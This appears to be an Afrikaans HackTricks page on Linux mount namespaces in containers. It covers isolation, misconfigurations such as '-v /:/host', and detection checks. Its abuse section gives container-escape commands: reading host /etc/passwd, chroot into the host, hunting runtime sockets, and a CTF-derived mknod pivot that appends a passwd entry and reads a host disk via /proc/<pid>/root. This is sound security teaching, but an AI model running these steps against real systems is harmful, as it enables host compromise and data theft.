# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

Die mount namespace beheer die **mount table** wat 'n proses sien. Dit is een van die belangrikste container isolasie-funksies omdat die root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, en baie runtime-spesifieke helper mounts almal deur daardie mount table uitgedruk word. Twee prosesse kan albei toegang hê tot `/`, `/proc`, `/sys`, of `/tmp`, maar waarna daardie paaie verwys hang af van die mount namespace waarin hulle is.

Vanuit 'n container-security-perspektief is die mount namespace dikwels die verskil tussen "dit is 'n netjies voorbereide toepassing-lêerstelsel" en "hierdie proses kan direk die host-lêerstelsel sien of beïnvloed". Daarom draai bind mounts, `hostPath` volumes, privileged mount operations, en skryfbare `/proc` of `/sys` blootstellings alles om hierdie namespace.

## Operation

Wanneer 'n runtime 'n container begin, skep dit gewoonlik 'n vars mount namespace, berei 'n root filesystem vir die container voor, mount procfs en ander helper-lêerstelsels soos nodig, en voeg dan opsioneel bind mounts, tmpfs mounts, secrets, config maps, of host paths by. Sodra daardie proses binne die namespace loop, is die stel mounts wat dit sien grootliks ontkoppel van die host se standaard-uitsig. Die host mag steeds die werklike onderliggende lêerstelsel sien, maar die container sien die weergawe wat deur die runtime vir dit bymekaargemaak is.

Dit is kragtig omdat dit die container laat glo dit het sy eie root filesystem selfs al bestuur die host steeds alles. Dit is ook gevaarlik, want as die runtime die verkeerde mount blootstel, kry die proses skielik sigbaarheid in host-bronne wat die res van die sekuriteitsmodel dalk nie ontwerp is om te beskerm nie.

## Lab

Jy kan 'n privaat mount namespace skep met:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
As jy 'n ander shell buite daardie namespace oopmaak en die mount table inspekteer, sal jy sien dat die tmpfs mount slegs binne die geïsoleerde mount namespace bestaan. Dit is 'n nuttige oefening omdat dit wys dat mount-isolasie nie abstrakte teorie is nie; die kernel bied letterlik 'n ander mount table aan die proses.
As jy 'n ander shell buite daardie namespace oopmaak en die mount table inspekteer, sal die tmpfs mount slegs binne die geïsoleerde mount namespace bestaan.

Binne containers, 'n vinnige vergelyking is:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Die tweede voorbeeld demonstreer hoe maklik dit is vir 'n runtime-konfigurasie om 'n reuse gapings deur die filesystem-grens te slaan.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O almal vertrou op 'n private mount namespace vir normale containers. Kubernetes bou bo-op dieselfde meganisme vir volumes, projected secrets, config maps, en `hostPath` mounts. Incus/LXC omgewings vertrou ook swaar op mount namespaces, veral omdat system containers dikwels ryker en meer masjien-agtige filesystems blootstel as application containers.

Dit beteken dat wanneer jy 'n container filesystem-probleem hersien, jy gewoonlik nie na 'n geïsoleerde Docker-quirk kyk nie. Jy kyk na 'n mount-namespace en runtime-konfigurasie-probleem wat deur watter platform ookal die workload gelanseer het uitgedruk word.

## Konfigurasiefoute

Die mees voor die hand liggende en gevaarlike fout is om die host root filesystem of 'n ander sensitiewe host-pad bloot te stel deur 'n bind mount, byvoorbeeld `-v /:/host` of 'n writable `hostPath` in Kubernetes. Op daardie punt is die vraag nie meer "kan die container op een of ander manier ontsnap nie?" maar eerder "hoeveel nuttige host-inhoud is reeds direk sigbaar en skryfbaar?" 'n Writable host bind mount verander dikwels die res van die exploit in 'n eenvoudige saak van lêer-plekke, chrooting, konfigurasiewysiging, of runtime-socket-ontdekking.

'n Ander algemene probleem is om host `/proc` of `/sys` bloot te stel op maniere wat die veiliger container-uitsig omseil. Hierdie filesystems is nie gewone data-mounts nie; dit is koppelvlakke na kernel- en prosesstatus. As die workload direk by die host-weergawes uitkom, hou baie van die aannames agter container-hardening op om skoon van toepassing te wees.

Read-only beskermings maak ook saak. 'n Read-only root filesystem beveilig nie magies 'n container nie, maar dit verwyder 'n groot hoeveelheid aanvaller-staging-ruimte en maak persistentie, helper-binary-plek, en konfigurasie-manipulasie moeiliker. Omgekeerd gee 'n writable root of writable host bind mount 'n aanvaller ruimte om die volgende stap voor te berei.

## Misbruik

Wanneer die mount namespace misbruik word, doen aanvallers gewoonlik een van vier dinge. Hulle **lees host-data** wat buite die container moes gebly het. Hulle **wysig host-konfigurasie** deur writable bind mounts. Hulle **mount of remount addisionele hulpbronne** indien capabilities en seccomp dit toelaat. Of hulle **bereik kragtige sockets en runtime-state directories** wat hulle toelaat om die container-platform self vir meer toegang te vra.

As die container reeds die host filesystem kan sien, verander die res van die sekuriteitsmodel onmiddellik.

Wanneer jy 'n vermoede het van 'n host bind mount, bevestig eers wat beskikbaar is en of dit skryfbaar is:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
As die host se root-lêerstelsel as read-write gemonteer is, is direkte toegang tot die host dikwels so eenvoudig soos:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
As die doel bevoorregte runtime-toegang is eerder as direkte chrooting, enumereer sockets en runtime-status:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Indien `CAP_SYS_ADMIN` teenwoordig is, toets ook of nuwe mounts van binne die container geskep kan word:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Volledige voorbeeld: Two-Shell `mknod` Pivot

'n Meer gespesialiseerde misbruikpad kom voor wanneer die container root user block devices kan skep, die host en container 'n gebruikersidentiteit op 'n bruikbare wyse deel, en die attacker reeds 'n low-privilege foothold op die host het. In daardie situasie kan die container 'n device node soos `/dev/sda` skep, en die low-privilege host user kan dit later deur `/proc/<pid>/root/` lees vir die ooreenstemmende container process.

Binne die container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vanaf die host, as die ooreenstemmende low-privilege user nadat jy die container shell PID gevind het:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die belangrike les is nie die presiese CTF string search nie. Dit is dat mount-namespace exposure deur `/proc/<pid>/root/` 'n host-user in staat kan stel om container-created device nodes te hergebruik, selfs al het cgroup device policy direkte gebruik binne die container self verhoed.

## Checks

Hierdie kommando's is daar om jou die lêerstelsel-uitsig te wys waarin die huidige proses eintlik leef. Die doel is om host-derived mounts, skryfbare sensitiewe paaie, en enigiets wat wyer lyk as 'n normale application container root filesystem te identifiseer.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Wat hier interessant is:

- Bind mounts vanaf die host, veral `/`, `/proc`, `/sys`, runtime state directories, of socket locations, moet onmiddellik uitstaan.
- Onverwagte read-write mounts is gewoonlik belangriker as 'n groot aantal read-only helper mounts.
- `mountinfo` is dikwels die beste plek om te sien of 'n pad werklik host-derived of overlay-backed is.

Hierdie kontroles stel vas **watter hulpbronne in hierdie namespace sigbaar is**, **watter daarvan host-derived is**, en **watter van hulle skryfbaar of veiligheidsgevoelig is**.
